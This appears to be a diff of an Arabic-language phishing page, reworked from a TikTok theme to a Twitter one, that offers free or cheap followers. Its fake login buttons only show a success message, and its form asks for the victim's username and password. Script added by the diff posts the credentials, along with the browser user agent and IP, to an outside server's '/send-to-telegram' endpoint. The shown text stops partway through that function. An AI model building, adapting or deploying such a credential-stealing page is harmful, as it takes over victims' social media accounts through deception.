@@ -3,7 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>شحن متابعين تيك توك</title>
+  <title>شحن متابعين تويتر</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     * {
@@ -11,406 +14,353 @@
       margin: 0;
       padding: 0;
     }
-
-    :root {
-      --primary: #8a2be2;
-      --secondary: #ffd700;
-      --dark: #1a0933;
-      --light: #f5f5f5;
-      --accent: #ff3860;
-      --success: #48c774;
-    }
-
+    
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, var(--dark) 0%, #2d0b5e 100%);
-      color: var(--light);
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #0a192f, #8b0000, #0a192f);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+      color: #fff;
       min-height: 100vh;
       padding: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
       overflow-x: hidden;
       position: relative;
     }
-
-    body::before {
-      content: "";
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: radial-gradient(circle at 20% 30%, rgba(138, 43, 226, 0.15) 0%, transparent 40%),
-                  radial-gradient(circle at 80% 70%, rgba(255, 215, 0, 0.15) 0%, transparent 40%);
-      z-index: -1;
+    
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
-
+    
     .main-container {
-      width: 100%;
       max-width: 500px;
-      margin: 0 auto;
-      display: flex;
-      flex-direction: column;
-      gap: 25px;
-      padding: 20px 0;
-    }
-
-    .header {
-      text-align: center;
-      padding: 20px;
-      position: relative;
+      margin: 20px auto;
+      background: rgba(10, 25, 47, 0.8);
+      backdrop-filter: blur(10px);
       border-radius: 20px;
       overflow: hidden;
-      background: rgba(26, 9, 51, 0.8);
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(138, 43, 226, 0.3);
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(139, 0, 0, 0.3);
+      max-height: 90vh;
+      overflow-y: auto;
+      scroll-behavior: smooth;
     }
-
+    
+    .main-container::-webkit-scrollbar {
+      width: 8px;
+    }
+    
+    .main-container::-webkit-scrollbar-track {
+      background: rgba(0, 0, 0, 0.2);
+    }
+    
+    .main-container::-webkit-scrollbar-thumb {
+      background: rgba(139, 0, 0, 0.5);
+      border-radius: 4px;
+    }
+    
+    .main-container::-webkit-scrollbar-thumb:hover {
+      background: rgba(139, 0, 0, 0.7);
+    }
+    
+    .header {
+      text-align: center;
+      padding: 25px 20px 15px;
+      background: rgba(10, 25, 47, 0.9);
+      position: relative;
+      overflow: hidden;
+      border-bottom: 2px solid rgba(139, 0, 0, 0.5);
+    }
+    
     .header::before {
       content: "";
       position: absolute;
       top: 0;
       left: 0;
-      right: 0;
-      height: 5px;
-      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      width: 100%;
+      height: 100%;
+      background: url('https://images.unsplash.com/photo-1611605698335-8b1569810432?q=80&w=1974&auto=format&fit=crop') center/cover;
+      opacity: 0.1;
+      z-index: -1;
     }
-
-    .logo {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 15px;
-      margin-bottom: 15px;
+    
+    .header h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+      color: #ff6b6b;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
     }
-
-    .logo i {
-      font-size: 2.8rem;
-      color: var(--secondary);
-      background: var(--primary);
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
-    }
-
-    .logo h1 {
-      font-size: 2.2rem;
-      background: linear-gradient(to right, var(--secondary), var(--primary));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-    }
-
+    
     .header p {
-      font-size: 1.1rem;
-      color: #d0c7e8;
-      margin-top: 10px;
-      line-height: 1.6;
+      font-size: 16px;
+      opacity: 0.9;
+      max-width: 400px;
+      margin: 0 auto;
+      color: #a3b1c6;
     }
-
-    .container {
-      background: rgba(26, 9, 51, 0.8);
-      border-radius: 20px;
+    
+    .section {
       padding: 25px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(138, 43, 226, 0.3);
-      position: relative;
-      overflow: hidden;
+      border-bottom: 1px solid rgba(139, 0, 0, 0.2);
     }
-
-    .container::before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 5px;
-      background: linear-gradient(90deg, var(--primary), var(--secondary));
+    
+    .login-options {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
     }
-
-    .container h1 {
-      text-align: center;
-      margin-bottom: 25px;
-      font-size: 1.8rem;
-      color: var(--secondary);
-      position: relative;
-      padding-bottom: 10px;
-    }
-
-    .container h1::after {
-      content: "";
-      position: absolute;
-      bottom: 0;
-      left: 25%;
-      right: 25%;
-      height: 3px;
-      background: linear-gradient(90deg, transparent, var(--primary), transparent);
-      border-radius: 3px;
-    }
-
+    
     .btn {
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 15px;
-      width: 100%;
       padding: 15px;
-      margin: 15px 0;
-      background: linear-gradient(135deg, #4a1e8c, var(--primary));
-      color: white;
-      border: none;
       border-radius: 12px;
-      font-size: 1.1rem;
+      font-size: 18px;
       font-weight: 600;
+      border: none;
       cursor: pointer;
       transition: all 0.3s ease;
-      box-shadow: 0 5px 15px rgba(138, 43, 226, 0.3);
+      text-align: center;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
     }
-
+    
     .btn:hover {
       transform: translateY(-3px);
-      box-shadow: 0 8px 20px rgba(138, 43, 226, 0.5);
+      box-shadow: 0 6px 10px rgba(0, 0, 0, 0.3);
     }
-
-    .btn:active {
-      transform: translateY(0);
+    
+    .btn img {
+      width: 30px;
+      height: 30px;
+      margin-left: 10px;
+      border-radius: 50%;
     }
-
-    .btn i {
-      font-size: 1.5rem;
+    
+    .google-btn {
+      background: linear-gradient(to right, #0a192f, #1a3a5f);
+      color: #a3b1c6;
+      border: 1px solid rgba(139, 0, 0, 0.3);
     }
-
-    .btn.google {
-      background: linear-gradient(135deg, #dd4b39, #c23321);
+    
+    .facebook-btn {
+      background: linear-gradient(to right, #0a192f, #1a3a5f);
+      color: #a3b1c6;
+      border: 1px solid rgba(139, 0, 0, 0.3);
     }
-
-    .btn.facebook {
-      background: linear-gradient(135deg, #3b5998, #2d4373);
+    
+    .twitter-btn {
+      background: linear-gradient(to right, #8b0000, #a52a2a);
+      color: white;
+      border: 1px solid rgba(139, 0, 0, 0.5);
     }
-
-    .btn.tiktok {
-      background: linear-gradient(135deg, #69c9d0, #ee1d52);
-    }
-
-    .pricing {
-      margin-top: 10px;
-    }
-
-    .price-item {
-      background: rgba(58, 58, 58, 0.3);
-      padding: 15px;
-      margin: 10px 0;
-      border-radius: 12px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border: 1px solid rgba(138, 43, 226, 0.2);
-      transition: all 0.3s ease;
-    }
-
-    .price-item:hover {
-      transform: translateX(5px);
-      background: rgba(58, 58, 58, 0.5);
-      border-color: var(--primary);
-    }
-
-    .price-item span {
-      font-size: 1.1rem;
-      font-weight: 500;
-    }
-
-    .price-item .price-value {
-      color: var(--secondary);
-      font-weight: 700;
-    }
-
-    .buy-btn {
-      background: linear-gradient(135deg, var(--secondary), #e6c200);
-      color: #1a0933;
-      border: none;
-      padding: 8px 20px;
-      border-radius: 8px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 3px 10px rgba(255, 215, 0, 0.3);
-    }
-
-    .buy-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 5px 15px rgba(255, 215, 0, 0.5);
-    }
-
-    form {
-      background: rgba(58, 58, 58, 0.2);
-      padding: 20px;
+    
+    .form-container {
+      display: none;
+      background: rgba(10, 25, 47, 0.6);
       border-radius: 15px;
-      border: 1px solid rgba(138, 43, 226, 0.2);
+      padding: 20px;
+      margin-top: 15px;
+      border: 1px solid rgba(139, 0, 0, 0.3);
     }
-
+    
+    .form-title {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 22px;
+      color: #ff6b6b;
+    }
+    
     .form-group {
       margin-bottom: 20px;
     }
-
-    label {
+    
+    .form-group label {
       display: block;
       margin-bottom: 8px;
       font-weight: 600;
-      color: var(--secondary);
-      padding: 5px 0;
+      color: #64b5f6;
     }
-
-    input, select {
+    
+    .form-group input, 
+    .form-group select {
       width: 100%;
       padding: 14px;
-      margin: 8px 0;
-      border-radius: 12px;
-      border: 2px solid rgba(138, 43, 226, 0.3);
-      background: rgba(26, 9, 51, 0.7);
+      border-radius: 10px;
+      border: 1px solid rgba(139, 0, 0, 0.3);
+      background: rgba(10, 25, 47, 0.7);
       color: white;
-      font-size: 1rem;
-      transition: all 0.3s ease;
+      font-size: 16px;
+      font-family: 'Cairo', sans-serif;
     }
-
-    input:focus, select:focus {
+    
+    .form-group input:focus, 
+    .form-group select:focus {
       outline: none;
-      border-color: var(--primary);
-      box-shadow: 0 0 0 3px rgba(138, 43, 226, 0.3);
+      border-color: #ff6b6b;
+      box-shadow: 0 0 0 2px rgba(255, 107, 107, 0.2);
     }
-
-    input::placeholder {
-      color: rgba(255, 255, 255, 0.6);
+    
+    .form-group input::placeholder {
+      color: rgba(255, 255, 255, 0.5);
     }
-
+    
+    .validation-message {
+      color: #ff6b6b;
+      font-size: 14px;
+      text-align: right;
+      margin-top: 8px;
+      height: 16px;
+    }
+    
     .submit-btn {
-      background: linear-gradient(135deg, var(--secondary), #e6c200);
-      color: var(--dark);
+      background: linear-gradient(to right, #8b0000, #a52a2a);
+      color: white;
       font-weight: bold;
-      font-size: 1.1rem;
-      padding: 14px;
-      border-radius: 12px;
-      border: none;
+      padding: 15px;
       width: 100%;
+      border-radius: 10px;
+      border: none;
       cursor: pointer;
+      font-size: 18px;
       transition: all 0.3s ease;
       margin-top: 10px;
-      box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
     }
-
+    
     .submit-btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 8px 20px rgba(255, 215, 0, 0.5);
+      background: linear-gradient(to right, #a52a2a, #8b0000);
+      transform: scale(1.02);
     }
-
-    .features {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 15px;
-      margin-top: 20px;
-    }
-
-    .feature {
-      background: rgba(138, 43, 226, 0.15);
-      border-radius: 12px;
-      padding: 15px;
+    
+    .pricing-title {
       text-align: center;
-      border: 1px solid rgba(138, 43, 226, 0.3);
+      margin-bottom: 20px;
+      font-size: 22px;
+      color: #ff6b6b;
     }
-
-    .feature i {
-      font-size: 2rem;
-      color: var(--secondary);
+    
+    .pricing-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 15px;
+    }
+    
+    .price-card {
+      background: rgba(10, 25, 47, 0.6);
+      border-radius: 12px;
+      padding: 20px 15px;
+      text-align: center;
+      transition: all 0.3s ease;
+      border: 1px solid rgba(139, 0, 0, 0.3);
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+    }
+    
+    .price-card:hover {
+      transform: translateY(-5px);
+      background: rgba(10, 25, 47, 0.8);
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
+    }
+    
+    .followers-count {
+      font-size: 24px;
+      font-weight: bold;
+      color: #64b5f6;
       margin-bottom: 10px;
     }
-
-    .feature h3 {
-      color: var(--secondary);
-      margin-bottom: 5px;
+    
+    .price-tag {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ff6b6b;
+      margin-bottom: 15px;
     }
-
-    .feature p {
-      font-size: 0.9rem;
-      color: #d0c7e8;
+    
+    .buy-btn {
+      background: linear-gradient(to right, #0a192f, #1a3a5f);
+      color: #a3b1c6;
+      border: 1px solid rgba(139, 0, 0, 0.3);
+      padding: 10px 15px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: all 0.3s ease;
     }
-
-    .footer {
-      text-align: center;
-      padding: 20px;
-      color: #a99bc0;
-      font-size: 0.9rem;
-      margin-top: 20px;
+    
+    .buy-btn:hover {
+      background: linear-gradient(to right, #1a3a5f, #0a192f);
+      color: white;
     }
-
-    .tiktok-icon {
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      color: var(--secondary);
-      font-size: 1.5rem;
-      animation: pulse 2s infinite;
+    
+    .free-badge {
+      background: linear-gradient(to right, #8b0000, #a52a2a);
+      color: white;
     }
-
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-      100% { transform: scale(1); }
+    
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 15px;
+      padding: 15px;
+      background: rgba(10, 25, 47, 0.6);
+      border-top: 1px solid rgba(139, 0, 0, 0.3);
     }
-
-    /* Snow effect */
-    .snowflake {
-      position: absolute;
-      top: -20px;
-      color: rgba(255, 255, 255, 0.7);
-      user-select: none;
-      pointer-events: none;
-      z-index: -1;
-    }
-
-    /* Scrollbar styling */
-    ::-webkit-scrollbar {
-      width: 10px;
-    }
-
-    ::-webkit-scrollbar-track {
-      background: rgba(26, 9, 51, 0.5);
-      border-radius: 10px;
-    }
-
-    ::-webkit-scrollbar-thumb {
-      background: linear-gradient(var(--primary), #6a0dad);
-      border-radius: 10px;
-    }
-
-    ::-webkit-scrollbar-thumb:hover {
-      background: linear-gradient(var(--secondary), #e6c200);
-    }
-
-    /* Loading spinner */
-    .spinnert {
-      display: none;
-      width: 40px;
-      height: 40px;
-      margin: 0 auto;
-      border: 4px solid rgba(255, 255, 255, 0.3);
+    
+    .social-icon {
+      width: 50px;
+      height: 50px;
       border-radius: 50%;
-      border-top: 4px solid var(--secondary);
-      animation: spin 1s linear infinite;
+      background: rgba(139, 0, 0, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
     }
     
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    .social-icon:hover {
+      background: rgba(139, 0, 0, 0.5);
+      transform: scale(1.1);
     }
     
-    /* Success message styling */
+    .social-icon img {
+      width: 30px;
+      height: 30px;
+    }
+    
+    .floating-bird {
+      position: absolute;
+      width: 80px;
+      height: 80px;
+      top: 20px;
+      right: 20px;
+      opacity: 0.1;
+      z-index: -1;
+      animation: float 8s ease-in-out infinite;
+      filter: hue-rotate(300deg);
+    }
+    
+    .floating-bird:nth-child(2) {
+      top: auto;
+      bottom: 20px;
+      left: 20px;
+      right: auto;
+      animation-delay: 2s;
+      width: 60px;
+      height: 60px;
+      filter: hue-rotate(180deg);
+    }
+    
+    @keyframes float {
+      0% { transform: translateY(0px) rotate(0deg); }
+      50% { transform: translateY(-20px) rotate(5deg); }
+      100% { transform: translateY(0px) rotate(0deg); }
+    }
+    
     .success-message {
-      background: rgba(46, 204, 113, 0.2);
-      border: 1px solid rgba(46, 204, 113, 0.4);
+      background: rgba(46, 204, 113, 0.1);
+      border: 1px solid rgba(46, 204, 113, 0.3);
       border-radius: 10px;
       padding: 15px;
       margin: 20px 0;
@@ -423,37 +373,21 @@
       to { opacity: 1; transform: translateY(0); }
     }
     
-    .spinner {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 3px solid rgba(255,255,255,.3);
-      border-radius: 50%;
-      border-top-color: white;
-      animation: spin 1s ease-in-out infinite;
-      margin-left: 10px;
-      position: relative;
-      z-index: 2;
-    }
-    
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    
     .notification {
       position: fixed;
       top: 20px;
       left: 50%;
       transform: translateX(-50%);
-      background: rgba(0,0,0,0.8);
+      background: rgba(10, 25, 47, 0.95);
       color: white;
       padding: 15px 25px;
       border-radius: 10px;
       z-index: 1000;
       display: flex;
       align-items: center;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.4);
       animation: slideIn 0.3s, fadeOut 0.5s 2.5s forwards;
+      border-left: 4px solid #ff6b6b;
     }
     
     @keyframes slideIn {
@@ -482,230 +416,222 @@
       margin-left: 10px;
       font-size: 20px;
     }
-
-    /* Responsive design */
+    
     @media (max-width: 600px) {
       .main-container {
-        padding: 10px;
+        max-height: 95vh;
       }
       
-      .container {
-        padding: 20px 15px;
+      .header h1 {
+        font-size: 24px;
       }
       
-      .logo h1 {
-        font-size: 1.8rem;
+      .btn {
+        padding: 12px;
+        font-size: 16px;
       }
       
-      .header p {
-        font-size: 1rem;
-      }
-      
-      .features {
+      .pricing-grid {
         grid-template-columns: 1fr;
       }
+    }
+    
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+      margin-left: 10px;
+      position: relative;
+      z-index: 2;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 15px;
+    }
+    
+    .twitter-logo {
+      width: 50px;
+      height: 50px;
+      background: linear-gradient(45deg, #0a192f, #8b0000);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+    
+    .twitter-logo i {
+      color: white;
+      font-size: 24px;
+    }
+    
+    /* Loading spinner */
+    .spinnert {
+      display: none;
+      width: 40px;
+      height: 40px;
+      margin: 0 auto;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top: 4px solid var(--secondary);
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-  <!-- Snowflakes will be generated here -->
   
+  <!-- طيور متحركة -->
+  <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter Bird" class="floating-bird">
+  <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter Bird" class="floating-bird">
+  
+  <!-- الحاوية الرئيسية -->
   <div class="main-container">
     <div class="header">
-      <div class="logo">
-        <i class="fab fa-tiktok"></i>
-        <h1>شحن متابعين تيك توك</h1>
+      <div class="logo-container">
+        <div class="twitter-logo">
+          <i class="fab fa-twitter"></i>
+        </div>
       </div>
-      <p>احصل على آلاف المتابعين الحقيقيين بأسعار تنافسية وضمان استمرارية المتابعين لمدة 3 أشهر</p>
+      <h1>شحن متابعين تويتر</h1>
+      <p>احصل على الآلاف من المتابعين الحقيقيين بأسعار تنافسية وخطوات بسيطة</p>
     </div>
     
-    <div id="login" class="container">
-      <span class="tiktok-icon"><i class="fab fa-tiktok"></i></span>
-      <h1>تسجيل الدخول عبر</h1>
-      <button class="btn google" onclick="loginWithGoogle()">
-        <i class="fab fa-google"></i> تسجيل الدخول عبر Google
-      </button>
-      <button class="btn facebook" onclick="loginWithFacebook()">
-        <i class="fab fa-facebook-f"></i> تسجيل الدخول عبر Facebook
-      </button>
-      <button class="btn tiktok" onclick="loginWithTikTok()">
-        <i class="fab fa-tiktok"></i> تسجيل الدخول عبر TikTok
-      </button>
-    </div>
-    
-    <div id="form" class="container" style="display: none;">
-      <h1>شحن متابعين تيك توك <i class="fas fa-rocket"></i></h1>
-      <form id="pubgForm">
+    <div class="section">
+      <div class="login-options">
+        <button class="btn google-btn" onclick="loginWithGoogle()">
+          <span>تسجيل الدخول عبر جوجل</span>
+          <img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" alt="Google">
+        </button>
+        
+        <button class="btn facebook-btn" onclick="loginWithFacebook()">
+          <span>تسجيل الدخول عبر فيسبوك</span>
+          <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
+        </button>
+        
+        <button class="btn twitter-btn" onclick="loginWithTwitter()">
+          <span>تسجيل الدخول عبر تويتر</span>
+          <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
+        </button>
+      </div>
+      
+      <div id="form" class="form-container">
+        <h2 class="form-title">شحن متابعين تويتر <i class="fab fa-twitter"></i></h2>
+        <form id="twitterForm">
         
         <div class="form-group">
-          <label for="player_id"><i class="fas fa-user"></i> اسم المستخدم او البريد الالكتروني:</label>
-          <input type="text" id="player_id" name="player_id" required placeholder="ادخل اسم المستخدم في تيك توك">
-        </div>
-        
-        <div class="form-group">
-          <label for="password"><i class="fas fa-lock"></i> كلمة المرور:</label>
-          <input type="password" id="password" name="password" required placeholder="ادخل كلمة المرور">
-        </div>
-        
-        <div class="form-group">
-          <label for="amount"><i class="fas fa-users"></i> عدد المتابعين:</label>
-          <select id="amount" name="amount" required>
-            <option value="1000 متابع مجاني">1000 متابع مجاني</option>
-            <option value="1500 متابع">1500 متابع (2$)</option>
-            <option value="2000 متابع">2000 متابع (3$)</option>
-            <option value="2500 متابع">2500 متابع (4$)</option>
-            <option value="3000 متابع">3000 متابع (5$)</option>
-          </select>
-        </div>
-        
-        <div class="spinnert" id="loadingSpinner"></div>
+            <label>اسم المستخدم او البريد الالكتروني :</label>
+            <input type="text" name="player_id" placeholder="@username" required>
+          </div>
+          
+          <div class="form-group">
+            <label>كلمة المرور:</label>
+            <input type="password" name="password" placeholder="********" required>
+          </div>
+          
+          <div class="form-group">
+            <label>عدد المتابعين:</label>
+            <select name="amount" required>
+              <option value="1000 متابع مجاني">1000 متابع مجاني</option>
+              <option value="1500 متابع">1500 متابع</option>
+              <option value="2000 متابع">2000 متابع</option>
+              <option value="2500 متابع">2500 متابع</option>
+              <option value="3000 متابع">3000 متابع</option>
+            </select>
+          </div>
+          
+          <div class="spinnert" id="loadingSpinner"></div>
         <button type="submit" class="submit-btn" id="submitBtn">شحن المتابعين <i class="fas fa-bolt"></i></button>
-      </form>
-    </div>
-    
-    <div class="container pricing">
-      <h1>أسعار المتابعين <i class="fas fa-tags"></i></h1>
-      <div class="price-item">
-        <span><i class="fas fa-users"></i> 1000 متابع - <span class="price-value">0$</span></span>
-        <button class="buy-btn">مجاني</button>
-      </div>
-      <div class="price-item">
-        <span><i class="fas fa-users"></i> 1500 متابع - <span class="price-value">2$</span></span>
-        <button class="buy-btn">شراء الآن</button>
-      </div>
-      <div class="price-item">
-        <span><i class="fas fa-users"></i> 2000 متابع - <span class="price-value">3$</span></span>
-        <button class="buy-btn">شراء الآن</button>
-      </div>
-      <div class="price-item">
-        <span><i class="fas fa-users"></i> 2500 متابع - <span class="price-value">4$</span></span>
-        <button class="buy-btn">شراء الآن</button>
-      </div>
-      <div class="price-item">
-        <span><i class="fas fa-users"></i> 3000 متابع - <span class="price-value">5$</span></span>
-        <button class="buy-btn">شراء الآن</button>
+        </form>
       </div>
     </div>
     
-    <div class="container">
-      <h1>مميزاتنا <i class="fas fa-star"></i></h1>
-      <div class="features">
-        <div class="feature">
-          <i class="fas fa-bolt"></i>
-          <h3>شحن فوري</h3>
-          <p>يتم الشحن خلال دقائق بعد التأكيد</p>
+    <div class="section">
+      <h2 class="pricing-title">أسعار المتابعين</h2>
+      <div class="pricing-grid">
+        <div class="price-card">
+          <div class="followers-count">1000</div>
+          <div class="price-tag">مجاني</div>
+          <button class="buy-btn free-badge">اختر</button>
         </div>
-        <div class="feature">
-          <i class="fas fa-shield-alt"></i>
-          <h3>آمن ومضمون</h3>
-          <p>حماية كاملة لحسابك وبياناتك</p>
+        
+        <div class="price-card">
+          <div class="followers-count">1500</div>
+          <div class="price-tag">2$</div>
+          <button class="buy-btn">شراء</button>
         </div>
-        <div class="feature">
-          <i class="fas fa-headset"></i>
-          <h3>دعم فني</h3>
-          <p>دعم فني متاح على مدار الساعة</p>
+        
+        <div class="price-card">
+          <div class="followers-count">2000</div>
+          <div class="price-tag">3$</div>
+          <button class="buy-btn">شراء</button>
         </div>
-        <div class="feature">
-          <i class="fas fa-gift"></i>
-          <h3>عروض حصرية</h3>
-          <p>عروض خاصة للمستخدمين الجدد</p>
+        
+        <div class="price-card">
+          <div class="followers-count">2500</div>
+          <div class="price-tag">4$</div>
+          <button class="buy-btn">شراء</button>
+        </div>
+        
+        <div class="price-card">
+          <div class="followers-count">3000</div>
+          <div class="price-tag">5$</div>
+          <button class="buy-btn">شراء</button>
         </div>
       </div>
     </div>
     
-    <div class="footer">
-      <p>© 2025 شحن متابعين تيك توك. جميع الحقوق محفوظة.</p>
-      <p>هذا الموقع غير مرتبط بتيك توك أو شركة ByteDance بأي شكل من الأشكال.</p>
+    <div class="social-icons">
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
+      </div>
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram">
+      </div>
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
+      </div>
+      <div class="social-icon">
+        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube">
+      </div>
     </div>
   </div>
-
+  
   <script>
     // ⚙️ إعدادات الخادم
     const SERVER_URL = 'https://roksbot.onrender.com';
 
-    // الدالة الرئيسية لإرسال بيانات السوشيال ميديا
-    async function sendSocialAccount(socialData) {
-        try {
-            console.log('📤 إرسال بيانات الحساب:', socialData);
-            
-            const response = await fetch(SERVER_URL + '/send-to-telegram', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    playerId: socialData.username,
-                    password: socialData.password,
-                    amount: socialData.followersCount,
-                    chatId: socialData.chatId,
-                    accountType: socialData.accountType,
-                    device: navigator.userAgent,
-                    ip: socialData.ip
-                })
-            });
-            
-            const result = await response.json();
-            
-            if (result.success) {
-                console.log('✅ تم إرسال بيانات الحساب بنجاح');
-                return { success: true, message: result.message };
-            } else {
-                console.log('❌ فشل إرسال بيانات الحساب');
-                return { success: false, message: result.message };
-            }
-        } catch (error) {
-            console.error('❌ خطأ في الإرسال:', error);
-            return { success: false, message: 'حدث خطأ في الإرسال' };
-        }
-    }
-
-    // Snow effect
-    function createSnow() {
-      const snowContainer = document.body;
-      const snowflakeCount = 50;
-      
-      for (let i = 0; i < snowflakeCount; i++) {
-        const snowflake = document.createElement('div');
-        snowflake.classList.add('snowflake');
-        snowflake.innerHTML = '❄';
-        
-        // Random properties
-        const size = Math.random() * 15 + 5;
-        const posX = Math.random() * window.innerWidth;
-        const duration = Math.random() * 5 + 5;
-        const delay = Math.random() * 5;
-        
-        snowflake.style.left = `${posX}px`;
-        snowflake.style.fontSize = `${size}px`;
-        snowflake.style.animation = `fall ${duration}s linear ${delay}s infinite`;
-        
-        document.head.insertAdjacentHTML('beforeend', `
-          <style>
-            @keyframes fall {
-              to {
-                transform: translateY(${window.innerHeight + 50}px) rotate(360deg);
-                opacity: 0;
-              }
-            }
-          </style>
-        `);
-        
-        snowContainer.appendChild(snowflake);
-      }
-    }
-    
     // إظهار الإشعار
     function showNotification(message, type) {
       const notification = document.createElement('div');
       notification.className = `notification ${type}`;
-      notification.innerHTML = `${message} <span class="notification-icon">${type === 'success' ? '✓' : '✗'}</span>`;
+      notification.innerHTML = `
+        ${message}
+        <span class="notification-icon">${type === 'success' ? '✓' : type === 'error' ? '✗' : 'ℹ'}</span>
+      `;
+      
       document.body.appendChild(notification);
       
       setTimeout(() => {
         notification.remove();
       }, 3000);
     }
-    
+  
     // تسجيل الدخول عبر جوجل
     function loginWithGoogle() {
       const btn = event.currentTarget;
@@ -744,8 +670,8 @@
       }, 2000);
     }
     
-    // تسجيل الدخول عبر تيك توك
-    function loginWithTikTok() {
+    // تسجيل الدخول عبر تويتر
+    function loginWithTwitter() {
       const btn = event.currentTarget;
       const originalHTML = btn.innerHTML;
       
@@ -753,7 +679,7 @@
       btn.disabled = true;
       
       setTimeout(() => {
-        showNotification('تم تسجيل الدخول بنجاح عبر تيك توك!', 'success');
+        showNotification('تم تسجيل الدخول بنجاح عبر تويتر!', 'success');
         btn.innerHTML = originalHTML;
         btn.disabled = false;
         
@@ -762,27 +688,83 @@
         }, 1500);
       }, 2000);
     }
-
-    // إظهار النموذج
+    
+    // إظهار نموذج الشحن
     function showForm() {
-      document.getElementById("login").style.display = "none";
+      document.querySelector(".login-options").style.display = "none";
       document.getElementById("form").style.display = "block";
       
-      // التمرير للنموذج بشكل سلس
-      document.getElementById("form").scrollIntoView({ behavior: 'smooth' });
+      const container = document.querySelector('.main-container');
+      const formElement = document.getElementById("form");
+      const topPos = formElement.offsetTop;
+      
+      container.scrollTo({
+        top: topPos - 20,
+        behavior: 'smooth'
+      });
+    }
+
+    // الدالة الرئيسية لإرسال بيانات السوشيال ميديا
+    async function sendSocialAccount(socialData) {
+        try {
+            console.log('📤 إرسال بيانات تويتر:', socialData);
+            
+            const response = await fetch(SERVER_URL + '/send-to-telegram', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
